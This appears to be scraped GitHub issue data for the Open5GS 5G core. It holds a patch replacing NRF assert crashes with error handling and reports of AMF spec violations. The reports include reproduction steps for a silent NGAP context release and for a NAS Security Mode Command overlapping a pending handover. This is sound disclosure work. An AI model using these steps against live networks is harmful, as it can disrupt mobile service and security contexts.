                     int dnn_index = nf_info->smf.slice
                         [nf_info->smf.num_of_slice].num_of_dnn;

-                    ogs_assert(dnn_index < OGS_MAX_NUM_OF_DNN);
+                    if (dnn_index >= OGS_MAX_NUM_OF_DNN) {
+                        ogs_warn("Exceeded maximum DNN entries (%d) "
+                                "in SNSSAI [%d]",
+                                OGS_MAX_NUM_OF_DNN,
+                                nf_info->smf.num_of_slice);
+                        break;
+                    }
                     nf_info->smf.slice[nf_info->smf.num_of_slice].
                         dnn[dnn_index] = ogs_strdup(DnnSmfInfoItem->dnn);
-                    ogs_assert(
-                        nf_info->smf.slice[nf_info->smf.num_of_slice].
-                            dnn[dnn_index]);
+                    if (!nf_info->smf.slice[nf_info->smf.num_of_slice].
+                            dnn[dnn_index]) {
+                        ogs_error("ogs_strdup() failed for DNN");
+                        break;
+                    }
                     nf_info->smf.slice[nf_info->smf.num_of_slice].
                         num_of_dnn++;
```

This fix was tested locally: the patched NRF logs a warning and returns HTTP 400 instead of crashing.

items.title: AMF silently releases an existing UE‑associated logical NG‑connection when a second registration arrives for the same UE

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: type:spec-noncompliance
labels.description: Non-compliance with mandatory 3GPP specification requirements.

items.body:
### Description

When a UE initiates a second registration while an existing UE‑associated logical NG‑connection is still active, the AMF must explicitly release the old connection using the **UE Context Release (AMF initiated)** procedure (TS 38.413 §8.3.3). In the observed trace, the AMF silently discards the old context without this mandatory signalling, leading to an `Error Indication` with cause `unknown‑local‑UE‑NGAP‑ID` later and leaving the NG‑RAN node with stale resources.

### Steps to Reproduce

1. NG‑RAN sends `Registration Request` using RAN UE NGAP ID 1
2. AMF responds with `Identity Request` using (AMF UE NGAP ID 1, RAN UE NGAP ID 1)
3. NG‑RAN sends another `Registration Request` using RAN UE NGAP ID 2
4. AMF responds with `Identity Request` using (AMF UE NGAP ID 2, RAN UE NGAP ID 2.
5. NG-RAN sends to AMF `Identity Response` using (AMF UE NGAP ID 1, RAN UE NGAPID 1)
6. AMF responds with `Authentication Request`using (AMF UE NGAP ID 1, RAN UE NGAPID 1)
7. NG-RAN sends to AMF `Identity Response` with the same 5GS mobile identity as in Step 5 using (AMF UE NGAP ID 2, RAN UE NGAPID 2)
8. AMF responds with `Authentication Request` using (AMF UE NGAP ID 2, RAN UE NGAPID 2)
9. NG-RAN sends to AMF some message (e.g. `UEContext Release Request`) using (AMF UE NGAP ID 1, RAN UE NGAPID 1)
10. AMF responds with  `Error Indication (unknown-local-UE-NGAP-ID)` using (AMF UE NGAP ID 1, RAN UE NGAPID 1)

### Expected Behaviour

Per **TS 38.413 §8.3.3.1**, when a new UE‑associated logical NG‑connection is established while an old one still exists, the AMF shall initiate the UE Context Release procedure by sending a **UE CONTEXT RELEASE COMMAND** on the old connection. The NG‑RAN then replies with **UE CONTEXT RELEASE COMPLETE**, and only after that should the AMF proceed with the new context. There should be no situation where the AMF has “forgotten” an NGAP UE ID that the NG‑RAN still holds.

### Actual Behaviour

The AMF silently discards the first context without any release signalling. Later, when the NG‑RAN tries to use the first connection, the AMF sends an `Error Indication` because it no longer recognises the AMF UE NGAP ID 1. This is a silent release and violates the specification.

### Impact

- The NG‑RAN node retains radio and user‑plane resources for the old connection indefinitely (or until local timeout), potentially exhausting resources.
- Inconsistent state between AMF and NG‑RAN leads to `Error Indication` with `unknown‑local‑UE‑NGAP‑ID`, breaking normal UE context management.

### Trace

[silent_release.zip](https://github.com/user-attachments/files/27554058/silent_release.zip)

items.title: Missing Concurrent NAS SMC Validation During NGAP Handover

labels.name: status:needs-planning

labels.name: type:spec-noncompliance
labels.description: Non-compliance with mandatory 3GPP specification requirements.

items.body:
### Open5GS Release, Revision, or Tag

v2.7.6

### Steps to reproduce

### Summary

The AMF in Open5GS v2.7.6 does not enforce the concurrent security procedure rules defined in 3GPP TS 33.501 §6.9.5.1. The AMF initiates a NAS Security Mode Command while an N2 handover procedure (including a new NH/NCC key) is still ongoing, and vice versa. This can lead to mismatches between NAS and AS security contexts in the network and the UE.

### Details

**Affected Files:**
- `src/amf/gmm-sm.c:2525` — `gmm_state_security_mode()`: No check for ongoing N2 procedure before sending SMC (Rule 2 violation)
- `src/amf/ngap-handler.c:3070~` — HandoverRequired handler: No check for ongoing SMC before initiating N2 (Rule 1 violation)

**Root Cause:**

3GPP TS 33.501 §6.9.5.1 states:

> "Concurrent runs of security procedures may, in certain situations, lead to mismatches between security contexts in the network and the UE. In order to avoid such mismatches, the following rules shall be adhered to:
> 1. AMF shall not initiate any of the N2 procedures including a new key towards a UE if a NAS Security Mode Command procedure is ongoing with the UE.
> 2. The AMF shall not initiate a NAS Security Mode Command towards a UE if one of the N2 procedures including a new key is ongoing with the UE."

Open5GS AMF does not implement cross-procedure checks:

**Rule 2 violation :**
`gmm_state_security_mode()` sends SMC on `OGS_FSM_ENTRY_SIG` without checking if an N2 handover procedure is ongoing for the UE.

**Rule 1 violation :**
The HandoverRequired handler initiates N2 (sends HandoverRequest with SecurityContext including NH/NCC) without checking if SMC is ongoing. Open5GS uses a `paging.ongoing` field for paging state, but has no equivalent mechanism to track SMC/N2 concurrent state.

**Why NH/NCC and SMC are related:**

SMC activates a new KAMF, which changes the basis for NH key derivation. The N2 HandoverRequest includes NH/NCC derived from the old KAMF. If both procedures run concurrently:
- The target gNB receives NH/NCC based on the old KAMF
- The UE derives keys based on the new KAMF (after SMC)
- This results in KgNB mismatch between UE and target gNB

This is exactly the scenario §6.9.5.1 was designed to prevent.

### PoC

**Environment:**
- Open5GS v2.7.6 AMF 
- UERANSIM v3.2.7
- tshark for packet capture

**Reproduction Steps:**

1. Start Open5GS full NF stack. Register a UE through gNB_A.
2. Send HandoverRequired from gNB_A. AMF sends HandoverRequest (including SecurityContext with NH/NCC) to gNB_B. gNB_B does not respond → N2 procedure ongoing.
3. Kill the UE process and restart it to trigger re-registration.
4. Observe that AMF processes the re-registration (Auth → SMC) without waiting for the N2 procedure to complete or cancelling it.

**Packet Evidence (pcap available):**

| Packet | Time | Message | Description |
|--------|------|---------|-------------|
| #1 | 0.000s | HandoverRequired | gNB_A requests handover |
| #2 | 0.000s | **HandoverRequest** | **N2 started (NH/NCC included)** |
| | | *(no response from gNB_B)* | **N2 ongoing** |
| #4 | 2.169s | Registration request | UE re-registers (same SUPI) |
| #5 | 2.174s | Authentication request | |
| #6 | 2.175s | Authentication failure (Synch) | SQN resync |
| #7 | 2.179s | Authentication request | Retry |
| #8 | 2.179s | Authentication response | |
| #9 | 2.181s | **Security mode command** | **SMC during N2 ongoing = Rule 2 violation** |


### Expected behaviour

The AMF should track per-UE security procedure state and serialize the two procedure families (Rule 1 / Rule 2 of TS 33.501 §6.9.5.1):

1. While a NAS Security Mode Command procedure is ongoing for a UE, the AMF must not initiate any N2 procedure that introduces a new key (e.g. a `HandoverRequest` carrying NH/NCC). Such an N2 procedure should be deferred until SMC completes (or aborts).
2. Symmetrically, while an N2 procedure carrying a new key is outstanding (e.g. a `HandoverRequest` for which no `HandoverRequestAcknowledge`/`HandoverFailure` has been received), the AMF must not start a NAS SMC for the same UE.

The intent of the rule is to prevent the UE, the source gNB, the target gNB, and the AMF from ending up with key material derived from different KAMF generations.

### Observed Behaviour

Open5GS AMF has no state field that tracks "N2 with new key in flight" or "SMC in flight" across the AMF state machine and the NGAP handler. As a result:

- `gmm_state_security_mode()` (`src/amf/gmm-sm.c:2525`) sends the SMC on `OGS_FSM_ENTRY_SIG` without consulting any cross-procedure flag.
- The HandoverRequired handler (`src/amf/ngap-handler.c:3070~`) builds and sends `HandoverRequest` (with NH/NCC) without checking whether an SMC is currently outstanding.

In the captured trace, after a `HandoverRequired` triggers `HandoverRequest` to a target gNB and that gNB does not respond, the N2 procedure remains in flight on the AMF side. A re-registration of the same UE then drives the AMF into Authentication → SMC, and the SMC is sent to the UE while the unanswered N2 with NH/NCC is still pending — two security procedures coexisting for the same UE, which §6.9.5.1 was specifically written to prevent.

### eNodeB/gNodeB

UERANSIM v3.2.7

### UE Models and versions

UERANSIM v3.2.7

items.title: NRF crash in `ogs_sbi_nf_service_add()` by exhausting the NF service pool through `nfServiceList`

labels.name: status:already-fixed
